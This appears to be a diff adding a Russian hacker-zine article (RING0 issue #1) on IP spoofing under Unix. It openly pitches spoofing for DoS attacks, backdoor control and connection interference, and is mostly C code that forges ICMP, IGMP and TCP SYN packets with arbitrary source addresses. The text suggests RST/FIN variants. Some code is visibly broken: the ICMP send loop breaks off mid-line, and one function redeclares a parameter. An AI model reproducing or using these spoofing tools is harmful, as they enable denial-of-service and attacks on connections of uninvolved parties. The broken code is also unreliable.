@@ -1,0 +1,391 @@
+
+ /*-----------------------------------------------------------------------*/
+ /*                       R I N G 0,    I S S U E   # 1                   */
+ /*-----------------------------------------------------------------------*/
+
+                           IP Spoofing под unix
+
+                                                            by Xen/HangUP
+
+  С  понятием  спуфинга,  надеюсь,  знакомы  все. Если под win9x сие дело
+ реализовывалось,  мягко говоря, через задницу (в w2k ситуация улучшилась
+ лишь слегка), то под UNIX-системами работать с пакетами на низком уровне
+ одно удовольствие :)
+  Зачем  это  может  потребоваться?  Для проведения DoS-атаки, управления
+ бэкдором,   отсылки   анонимной   почты,   вмешательства  в  соединение,
+ проходящее через сетевой интерфейс вашей машины... Вариантов море.
+  Рассмотрим простейший пример отсылки анонимных ICMP-пакетов.
+
+#include < netdb.h >
+#include < netinet/ip_icmp.h >
+
+/* Стандартный резолв */
+
+int resolve(const char *name, unsigned int port,
+            struct sockaddr_in *addr) {
+
+   struct hostent *host;
+
+   memset(addr, 0, sizeof(struct sockaddr_in));
+
+   addr->sin_family = AF_INET;
+   addr->sin_addr.s_addr = inet_addr(name);
+
+   if (addr->sin_addr.s_addr == -1) {
+
+      if (( host = gethostbyname(name) ) == NULL )  {
+         printf("%s resolve error\n", name);
+         return(-1);
+      }
+
+      addr->sin_family = host->h_addrtype;
+
+      memcpy((caddr_t)&addr->sin_addr, host->h_addr, host->h_length);
+
+   }
+
+   addr->sin_port = htons(port);
+
+   return(0);
+
+}
+
+
+/* Не менее стандартный чексам */
+
+unsigned short in_cksum(addr, len)
+    u_short *addr;
+    int len;
+{
+
+    register int nleft = len;
+    register u_short *w = addr;
+    register int sum = 0;
+
+    u_short answer = 0;
+
+
+
+    while (nleft > 1)  {
+        sum += *w++;
+        nleft -= 2;
+    }
+
+    if (nleft == 1) {
+        *(u_char *)(&answer) = *(u_char *)w ;
+        sum += answer;
+    }
+
+    sum = (sum >> 16) + (sum & 0xffff);
+    sum += (sum >> 16);
+    answer = ~sum;
+
+    return(answer);
+}
+
+/* Собственно, формирование пакета и скармливание его сокету */
+
+int fuckit(int socket,
+            unsigned long spoof_addr,
+            struct sockaddr_in *dest_addr) {
+
+   unsigned char  *packet;
+   struct iphdr   *ip;
+   struct icmphdr *icmp;
+
+   packet = (unsigned char *)malloc(sizeof(struct iphdr) +
+                                    sizeof(struct icmphdr) + 8);
+
+   ip = (struct iphdr *)packet;
+
+   icmp = (struct icmphdr *)(packet + sizeof(struct iphdr));
+
+   memset(ip, 0, sizeof(struct iphdr) + sizeof(struct icmphdr) + 8);
+
+   ip->ihl      = 5;
+   ip->version  = 4;
+   ip->id       = htons(1234);
+   ip->frag_off |= htons(0x2000);
+   ip->ttl      = 30;
+   ip->protocol = IPPROTO_ICMP;
+   ip->saddr    = spoof_addr;
+   ip->daddr    = dest_addr->sin_addr.s_addr;
+   ip->check    = in_cksum(ip, sizeof(struct iphdr));
+
+   icmp->type              = 12;
+   icmp->code              = 0;
+   icmp->checksum          = in_cksum(icmp, sizeof(struct icmphdr) + 1);
+
+   if (sendto(socket,
+              packet,
+              sizeof(struct iphdr) +
+              sizeof(struct icmphdr) + 1,0,
+              (struct sockaddr *)dest_addr,
+              sizeof(struct sockaddr)) == -1) { return(-1); }
+
+   free(packet);
+   return(0);
+}
+
+
+
+/* Основная функция. Открываем raw-сокет, резолвим адреса и
+   вызываем fuckit для работы с сокетом */
+
+
+
+int main(int argc, char **argv) {
+
+   struct sockaddr_in dest_addr;
+   unsigned int i,sock;
+   unsigned long src_addr;
+
+   if (argc != 4) {
+      printf("use it this way: src destination number_of_packets\n");
+      return(-1);
+   }
+
+
+   if((sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
+      printf("raw socket not opened\n");
+      return(-1);
+   }
+
+   if (resolve(argv[1],0,&dest_addr) == -1) {
+      printf("source resolve error\n");
+      return(-1);
+   }
+
+   src_addr = dest_addr.sin_addr.s_addr;
+
+   if (resolve(argv[2], 0, &dest_addr) == -1) {
+      printf("destination resolve error\n");
+      return(-1);
+   }
+
+   printf("sending packets\n");
+
+   for (i = 0; i
+
+
+  Возможно,  вам потребуется подключить дополнительные хедеры, у меня все
+ прошло и так.
+
+  За  комментариями о параметрах пакетов смотрите соответствующие RFC или
+ .h .
+
+  IGMP можно отсылать так:
+
+int send_igmp(int socket,
+                 unsigned long spoof_addr,
+                 struct sockaddr_in *dest_addr) {
+
+   unsigned char  *packet;
+   struct iphdr   *ip;
+   struct igmphdr *igmp;
+
+   packet = (unsigned char *)malloc(sizeof(struct iphdr) +
+                                    sizeof(struct igmphdr) + 8);
+
+   ip = (struct iphdr *)packet;
+   igmp = (struct igmphdr *)(packet + sizeof(struct iphdr));
+
+   memset(ip,0,sizeof(struct iphdr) + sizeof(struct igmphdr) + 8);
+
+   ip->ihl      = 5;
+   ip->version  = 4;
+   ip->id       = htons(34717);
+   ip->frag_off = htons(0x2000);
+   ip->ttl      = 255;
+   ip->protocol = IPPROTO_IGMP;
+   ip->saddr    = spoof_addr;
+   ip->daddr    = dest_addr->sin_addr.s_addr;
+   ip->check    = in_cksum(ip, sizeof(struct iphdr));
+
+   igmp->type              = 8;
+   igmp->code              = 0;
+
+   if (sendto(socket,
+              packet,
+              sizeof(struct iphdr) +
+              sizeof(struct igmphdr) + 1,0,
+              (struct sockaddr *)dest_addr,
+              sizeof(struct sockaddr)) == -1) { return(-1); }
+
+   free(packet);
+
+   return(0);
+}
+
+
+  А вот так или примерно так ;) работают с TCP:
+
+
+#define _BSD_SOURCE
+
+
+#include < stdio.h >
+#include < stdlib.h >
+#include < unistd.h >
+#include < string.h >
+#include < netdb.h >
+#include < net/if.h >
+#include < netinet/in.h >
+#include < netinet/ip.h >
+#include < netinet/tcp.h >
+#include < sys/ioctl.h >
+#include < sys/types.h >
+#include < sys/socket.h >
+#include < arpa/inet.h >
+
+/* Влом разбираться с полными заголовками... */
+
+struct tmp {
+        u_long saddr;
+        u_long daddr;
+        u_char zero;
+        u_char protocol;
+        u_short length;
+};
+
+/* skipped some usual stuff... */
+
+/* Отсылка пакета. А вы о чем подумали? :) */
+
+int sendpack(int s, u_long srcaddr, u_short srcport, u_long dstaddr,
+             u_short dstport,u_short th_flags,
+             u_char *packet,u_long length)
+{
+        u_char packet[sizeof(struct ip) + sizeof(struct tmp) +
+                            sizeof(struct tcphdr)];
+
+        struct sockaddr_in fuck_addr;
+
+        struct in_addr srcinaddr,dstinaddr;
+
+        struct ip *ip = (struct ip *) packet;
+
+        struct tmp *tmp = (struct tmp *) (packet + sizeof(struct ip));
+
+        struct tcphdr *tcp = (struct tcphdr *) (packet + sizeof(struct ip)
+
+                                + sizeof(struct tmp));
+
+        bzero(packet, sizeof(packet));
+
+        bzero(&fuck_addr,sizeof(fuck_addr));
+
+
+        srcinaddr.s_addr = srcaddr;
+
+        dstinaddr.s_addr = dstaddr;
+
+        tmp->saddr = srcaddr;
+        tmp->daddr = dstaddr;
+        tmp->zero = 0;
+        tmp->protocol=IPPROTO_TCP;
+        tmp->length = htons(sizeof (struct tcphdr));
+
+        ip->ip_v = 4;
+        ip->ip_hl = 5;
+        ip->ip_id = 1234;
+        ip->ip_src = srcinaddr;
+        ip->ip_dst = dstinaddr;
+        ip->ip_p = IPPROTO_TCP;
+        ip->ip_ttl = 40;
+        ip->ip_off = 0;
+        ip->ip_len = sizeof(struct ip) + sizeof(struct tcphdr) + length;
+
+        tcp->th_sport = htons(srcport);
+        tcp->th_dport = htons(dstport);
+        tcp->th_seq = htonl(rand());
+        tcp->th_ack = htonl(rand());
+        tcp->th_off=5;
+        tcp->th_flags = th_flags;
+        tcp->th_urp = 0;
+        tcp->th_sum = in_cksum((u_short *) tmp,
+
+                                        sizeof(struct tmp) +
+
+                                         sizeof(struct tcphdr));
+
+        bcopy(tcp,tmp,sizeof(struct tcphdr));
+
+        fuck_addr.sin_family=AF_INET;
+        fuck_addr.sin_addr.s_addr=dstaddr;
+
+        sendto(s,packet,sizeof(struct ip) +
+
+        sizeof(struct tcphdr) + length, 0,
+         (struct sockaddr *) &fuck_addr,sizeof(fuck_addr));
+
+        return 0;
+}
+
+void    main(argc,argv)
+
+        int argc;
+        char **argv;
+{
+
+        int rawsocket, rd, rsize;
+
+        int one=1;
+
+        u_char buf[1024];
+
+        struct sockaddr_in raddr;
+
+        struct ifreq ifr;
+
+        struct in_addr srcip, dstip;
+
+        u_short srcport, dstport;
+
+        if (argc!=5) printf("use: src_ip src_port dest_ip dest_port");
+
+        srcip.s_addr        =        resolve_name(argv[1]);
+        srcport                =        atoi(argv[2]);
+        dstip.s_addr        =        resolve_name(argv[3]);
+        dstport                =        atoi(argv[4]);
+
+
+        if ((rawsocket=socket(PF_INET, SOCK_RAW, IPPROTO_ICMP))<0) {
+                perror("raw socket error");
+                 exit(1);
+        }
+
+
+/* Говорим ядру, что сами займемся формированием IP-пакетов */
+
+
+        if (setsockopt(rawsocket, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one))<0) {
+                perror("setsockopt error");
+                close(rawsocket);
+                exit(1);
+        }
+
+
+
+printf("sending from source ip %s port %i ", inet_ntoa(srcip), srcport);
+printf("to destination ip %s port %i\n", inet_ntoa(dstip), dstport);
+
+
+/* Поставлена отсылка SYN-пакета. А кто мешает поиграться с FIN/RST ? */
+
+sendpack(rawsocket, srcip.s_addr, srcport,
+         dstip.s_addr, dstport, TH_SYN, NULL, 0);
+
+close(rawsocket);
+
+}
+
+
+  Надеюсь,  я  вас  не  очень утомил :) Приведены, разумеется, простейшие
+ примеры.  Для  серьезной  работы  не  следует также забывать о пэйлоаде,
+ правильности SEQ/ACK, враждебно настроенных роутерах и прочих вещах...
+
+
+
+
+
